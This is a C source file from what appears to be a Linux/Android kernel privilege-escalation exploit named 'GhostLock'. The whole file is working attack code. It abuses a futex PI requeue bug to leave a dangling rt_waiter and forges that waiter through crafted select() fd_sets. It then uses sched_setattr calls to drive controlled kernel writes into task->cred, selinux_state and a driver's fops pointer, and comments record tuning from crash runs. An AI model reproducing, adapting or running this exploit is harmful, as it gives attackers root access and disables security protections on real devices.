/*
 * route.c — GhostLock trigger + pselect stack forge + consumer punch.
 *
 * Trigger: 3-thread futex PI ring.
 *   A (waiter):  FUTEX_LOCK_PI(f_pi_chain), FUTEX_WAIT_REQUEUE_PI(f_wait -> f_pi_target)
 *   B (owner):   FUTEX_LOCK_PI(f_pi_target), FUTEX_LOCK_PI(f_pi_chain)   [blocks]
 *   main:        FUTEX_CMP_REQUEUE_PI(f_wait, 1, 1, f_pi_target, 0)
 *                -> rt_mutex_start_proxy_lock in B's context -> -EDEADLK
 *                -> remove_waiter() clears *B's* pi_blocked_on (the bug)
 *                -> A->pi_blocked_on dangles at A's dead rt_waiter stack slot.
 *
 * Forge: A then calls select(320,...) with crafted fd_sets. On this kernel
 * rt_waiter sits at stack_fds + 0x30, so fd_set words map onto the waiter
 * fields (see target_rv101.h PWS_*).
 *
 * Punch: consumer calls sched_setattr(A, SCHED_BATCH, nice) ->
 * rt_mutex_adjust_pi(A) -> rt_mutex_adjust_prio_chain() walks
 * A->pi_blocked_on (forged waiter) -> rb_erase(&waiter->tree_entry,
 * &fake_lock->waiters) performs the controlled write, then the walk
 * terminates cleanly at fake_task (pi_blocked_on = 0).
 */
#include "common.h"

/* punch schedule inside the 200ms select window (see consumer_thread) */
#define PUNCH_COUNT 5
#define PUNCH_INTERVAL_USEC 35000

int pselect_custom_write;
uintptr_t pselect_custom_target;
uintptr_t pselect_custom_value;
int pselect_child_node;

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int punch_done;

void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode) {
  pselect_custom_target = target;
  pselect_custom_value = value;
  pselect_custom_write = mode;
}

void clear_pselect_write(void) {
  pselect_custom_write = 0;
  pselect_custom_target = 0;
  pselect_custom_value = 0;
}

int pselect_custom_write_enabled(void) { return pselect_custom_write; }

/* ---- pselect fd_set forging ----------------------------------------------
 * global fd_set word = set*5 + word  (in: 0-4, out: 5-9, ex: 10-14)
 * waiter offset W  -> global word = 6 + W/8   (waiter = stack_fds + 0x30)
 */
static void pselect_put_global_word(fd_set *in, fd_set *out, fd_set *ex,
                                    int global_word, uint64_t value) {
  int set_idx = global_word / PSELECT_WORDS_PER_SET;
  int word_idx = global_word % PSELECT_WORDS_PER_SET;
  switch (set_idx) {
    case 0: fdset_put_word(in, word_idx, value); break;
    case 1: fdset_put_word(out, word_idx, value); break;
    case 2: fdset_put_word(ex, word_idx, value); break;
    default: pr_warning("pselect: cannot place global word %d\n", global_word);
  }
}

static void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in); FD_ZERO(out); FD_ZERO(ex);

  uintptr_t write_target = pselect_custom_target;
  uintptr_t write_value;

  if (pselect_custom_write == 3) {
    /* selftest: write into our own sprayed page (observable via recv) */
    write_target = page_base + SCRATCH_OFF;
    write_value = page_base + SAFE_OFF;
  } else if (pselect_custom_write == 5) {
    /* v9.32 FOPS-via-write#2: rb_erase case-1's child->pc fixup stores
     * tree_pc at write_value+0. Point write_value at the REAL fops field and
     * make tree_pc the (ALIGNED) fake_fops pointer, so write#2 = fake_fops
     * lands in ashmem_misc.fops directly. This sidesteps the write#1
     * direction (rb_left==node -> write#1 hits list.next, corrupting the
     * misc_list) entirely; write#1 only clobbers the fake table's llseek
     * slot (parent->rb_right), which the read path never uses. */
    write_value = pselect_custom_value;   /* = the fops field address */
  } else if (pselect_custom_write) {
    if (pselect_child_node) {
      if (pselect_custom_write == 2) {
        /* W2: write init_cred data-alias into task->cred; the follow-up
         * child->__rb_parent_color store lands in init_cred.usage (refcount
         * garbage is harmless). */
        write_value = data_addr(INIT_CRED);
      } else if (pselect_custom_write == 4) {
        /* W2 FOPS: write an arbitrary value (e.g. fake_fops) into an
         * arbitrary target (e.g. ashmem_misc.fops). */
        write_value = pselect_custom_value;
      } else {
        /* W1: write base+SAFE_OFF (low byte 0x00) into selinux_state */
        write_value = page_base + SAFE_OFF;
      }
    } else {
      write_value = 0;
    }
  } else {
    /* benign default: write into our own sprayed page */
    write_target = page_base + SCRATCH_OFF;
    write_value = 0;
  }

  /* forged waiter->tree_entry: parent_color=(target-8)|1 [RED: no color
   * rebalancing], right=write_value, left=NULL -> rb_erase case 1 writes
   * `parent->rb_right = child` == 8-byte store of write_value at target.
   * Mode 5 needs parent_color = fake_fops with COLOR=0 (aligned), because
   * tree_pc is the VALUE that write#2 stores into the fops field; an |1
   * color bit would make the stored pointer misaligned. */
  uint64_t tree_pc = (write_target - 8) | 1;
  if (pselect_custom_write == 5)
    tree_pc = (write_target - 8);
  if (env_flag("GL_POISON2", 0))
    tree_pc = 0xdead000000000001ULL;

  pselect_put_global_word(in, out, ex, PWS_TREE_PC, tree_pc);
  pselect_put_global_word(in, out, ex, PWS_TREE_RIGHT, write_value);
  pselect_put_global_word(in, out, ex, PWS_TREE_LEFT, 0);

  /* pi_tree_entry: unused by the 5.10 punch path, keep it benign */
  pselect_put_global_word(in, out, ex, PWS_PI_PC, 1);
  pselect_put_global_word(in, out, ex, PWS_PI_RIGHT, 0);
  pselect_put_global_word(in, out, ex, PWS_PI_LEFT, 0);

  /* task / lock / prio.
   * v9.31 FIX: waiter->task MUST be fake_task (sprayed page), NOT
   * data_addr(INIT_TASK). rt_mutex_adjust_prio_chain ends with
   * wake_q_add(head, waiter->task); when waiter->task == real init_task that
   * corrupts init_task->wake_q/usage and later wake_up_process(init_task)
   * panics (this is the run51/v9.30 punch-1 death — exposed once v9.30 fixed
   * P0_KERNEL_PHYS_LOAD and data_addr(INIT_TASK) finally pointed at the real
   * init_task instead of +0x800000 garbage). OnePlus uses fake_task here. */
  pselect_put_global_word(in, out, ex, PWS_TASK, fake_task);
  if (env_flag("GL_POISON", 0))
    pselect_put_global_word(in, out, ex, PWS_LOCK, 0xdead000000000000ULL);
  else
    pselect_put_global_word(in, out, ex, PWS_LOCK, fake_lock);
  pselect_put_global_word(in, out, ex, PWS_PRIO, FAKE_WAITER_PRIO);
}

static void open_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex))
      dup2(high_read, fd);
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock) {
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx\n",
             page_base, fake_lock);
    return;
  }

  int pipefd[2];
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) block_fd = pipefd[0];
  /* arm the timerfd so select blocks for the punch window */
  if (block_fd >= 0) {
    struct itimerspec its = {0};
    its.it_value.tv_nsec = 200000000;   /* 200ms */
    syscall(SYS_timerfd_settime, block_fd, 0, &its, NULL);
  }
  int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
  if (high_read < 0) {
    pr_error("pselect F_DUPFD errno=%d\n", errno);
    return;
  }

  fd_set in, out, ex;
  prepare_pselect_fdsets(&in, &out, &ex);
  open_selected_fds(&in, &out, &ex, high_read);

  pr_info("pselect route target=%016zx value=%016zx mode=%d page=%016zx "
          "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
          "in=%016llx out1=%016llx out2=%016llx out3=%016llx out4=%016llx "
          "ex0=%016llx ex1=%016llx ex2=%016llx ex3=%016llx ex4=%016llx\n",
          pselect_custom_target,
          pselect_custom_write == 2 ? data_addr(INIT_CRED)
                                    : (page_base + SAFE_OFF),
          pselect_custom_write, page_base, fake_lock, fake_w0, fake_task,
          (unsigned long long)fdset_get_word(&in, 0),
          (unsigned long long)fdset_get_word(&out, 1),
          (unsigned long long)fdset_get_word(&out, 2),
          (unsigned long long)fdset_get_word(&out, 3),
          (unsigned long long)fdset_get_word(&out, 4),
          (unsigned long long)fdset_get_word(&ex, 0),
          (unsigned long long)fdset_get_word(&ex, 1),
          (unsigned long long)fdset_get_word(&ex, 2),
          (unsigned long long)fdset_get_word(&ex, 3),
          (unsigned long long)fdset_get_word(&ex, 4));

  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&punch_done, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&punch_consume_go, 1);

  struct timeval timeout = { .tv_sec = 0, .tv_usec = PSELECT_TIMEOUT_USEC };
  pr_info("pselect: calling select now (window %dus, forged bytes resident)\n",
          PSELECT_TIMEOUT_USEC);
  errno = 0;
  int ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
  pr_info("pselect: select returned\n");
  int saved_errno = errno;
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 1);

  pr_info("pselect returned ret=%d errno=%d calls=%d success=%d\n",
          ret, saved_errno, atomic_load(&consumer_calls),
          atomic_load(&consumer_success));

  /* Wait for the consumer's punch to finish BEFORE touching the stack
   * again (the unlock's deep frames would clobber the forged bytes). */
  {
    int waited = 0;
    while (!atomic_load(&punch_done) && waited < 1000) {
      __asm__ volatile("yield" ::: "memory");
      waited++;
    }
    pr_info("punch_done=%d (waited %d spins)\n",
            atomic_load(&punch_done), waited);
  }

  close(high_read);
  if (block_fd != pipefd[0]) close(block_fd);
  close(pipefd[0]);
  close(pipefd[1]);
}

/* ---- threads ------------------------------------------------------------ */
static void *waiter_thread(void *arg) {
  (void)arg;
  disable_rseq_for_thread();
  int tid = gettid_();
  atomic_store(&waiter_tid, tid);
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("waiter lock chain errno=%d\n", errno);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) usleep(1000);

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  long wrp = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  pr_info("waiter wait_requeue_pi ret=%ld errno=%d\n", wrp, errno);

  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) usleep(1000);
  return NULL;
}

static void *owner_thread(void *arg) {
  (void)arg;
  disable_rseq_for_thread();
  if (futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("owner lock target errno=%d\n", errno);
  while (!atomic_load(&waiter_ready)) usleep(1000);
  atomic_store(&owner_started, 1);
  long r = futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  pr_info("owner lock chain ret=%ld errno=%d\n", r, errno);
  atomic_store(&owner_chain_done, 1);
  for (;;) sleep(1);
}

static void *consumer_thread(void *arg) {
  (void)arg;
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  int seen = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    /* Punch repeatedly across the select() window so at least one punch
     * lands while the forged fd_set bytes are resident on the waiter's
     * kernel stack. A punch fired before the waiter enters select() walks
     * the stale (real) rt_waiter left by the futex frame and returns
     * benignly — retrying later inside the window is what reaches the
     * forged waiter. Alternate the nice value so every punch is a real
     * policy change and re-runs the PI walk. */
    int base = atomic_load(&main_route_delay_usec);
    struct timespec t0;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (int p = 0; p < PUNCH_COUNT && !atomic_load(&punch_consume_stop); p++) {
      long target_us = base + (long)p * PUNCH_INTERVAL_USEC;
      for (;;) {
        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        long elapsed = (now.tv_sec - t0.tv_sec) * 1000000L +
                       (now.tv_nsec - t0.tv_nsec) / 1000;
        if (elapsed >= target_us) break;
        long rem = target_us - elapsed;
        usleep((useconds_t)(rem > 1000 ? rem - 500 : 200));
      }
      pr_info("consumer punch %d/%d (+%ldus) tid=%d\n", p + 1, PUNCH_COUNT,
              target_us, tid);
      atomic_fetch_add(&consumer_calls, 1);
      errno = 0;
      /* v9.21: FIXED nice — the punch that lands inside select() triggers
       * ONE prio walk (120 -> 139). That walk clobbers the forged waiter
       * fields on the stack (RB_CLEAR_NODE / rb_link_node / prio update),
       * so a SECOND walk would re-insert a self-referential rb_node into
       * the fake lock tree and the third punch would hang rb_erase's
       * case-C descent (observed: watchdog reset mid-run38). With the
       * same nice every following sched_setattr exits in
       * rt_mutex_adjust_pi's waiter->prio == task->prio check — no-op. */
      int nice_val = PSELECT_CONSUMER_NICE;
      long sched_ret = sched_setattr_tid(tid, nice_val);
      pr_info("consumer punch %d returned ret=%ld errno=%d\n", p + 1,
              sched_ret, errno);
      if (sched_ret != 0) {
        pr_warning("consumer sched_setattr(%d) ret=%ld errno=%d (%s)\n",
                   tid, sched_ret, errno, strerror(errno));
        /* fallback punch: contend on f_pi_target repeatedly across the window */
        for (int i = 0; i < 6 && sched_ret != 0; i++) {
          struct timespec ft = { .tv_sec = 0, .tv_nsec = 50000000 };
          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          }
        }
      }
      if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
    }
    atomic_store(&punch_done, 1);
  }
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&punch_done, 0);
  atomic_store(&main_route_delay_usec,
               env_int_range("GL_PUNCH_DELAY_USEC", PSELECT_ENTER_DELAY_USEC, 0,
                             PSELECT_TIMEOUT_USEC - 60000));
}

void run_main_route_threads(void) {
  reset_main_route_state();
  pthread_t waiter, owner, consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
    usleep(1000);
  usleep(50000);
  errno = 0;
  long rq = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  pr_info("requeue ret=%ld errno=%d\n", rq, errno);
  while (!atomic_load(&route_done)) usleep(5000);
  pthread_join(waiter, NULL);
  pthread_join(consumer, NULL);
}
